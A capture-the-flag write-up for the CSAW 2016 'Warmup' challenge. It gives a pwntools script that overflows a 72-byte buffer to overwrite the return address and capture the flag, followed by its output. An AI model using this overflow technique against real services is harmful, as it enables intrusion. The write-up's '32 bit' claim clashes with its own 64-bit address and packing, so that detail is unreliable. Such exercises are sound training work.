# Warmup 50
check the run.sh script located in the docker folder
We are given a executable to download with the description
> So you want to be a pwn-er huh? Well let's throw you an easy one ;)


## Check for the easy stuff
Running files says its a 32 bit elf but before we open it up ida checking for a buffer over flow resulted in a seg fault

```language-bash
λ  cat input | ./warmup
-Warm Up-
WOW:0x40060d
>
Segmentation fault (core dumped)
```

The address after wow is probably the return address we need to overwrite. The python script to do this is.



```language-python

from pwn import *
#context.log_level=True



if __name__ == "__main__":
    bufferSize = 72
    filler = 'a' * bufferSize
    r  = remote('localhost', 1235)
    address = r.recvuntil(">")
    print address
    address = address.split(":")[1]
    address = address.strip("\n>")
    address = p64(int(address, 16))
    print address
    payload = filler + address
    r.sendline(payload)
    print r.recvline()

```


# Executing script

```language-bash
λ  python exploit.py
[+] Opening connection to localhost on port 1235: Done
-Warm Up-
WOW:0x40060d
>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x06@\x00\x00\x00\x00\x00

FLAG{LET_US_BEGIN_CSAW_2016}
```
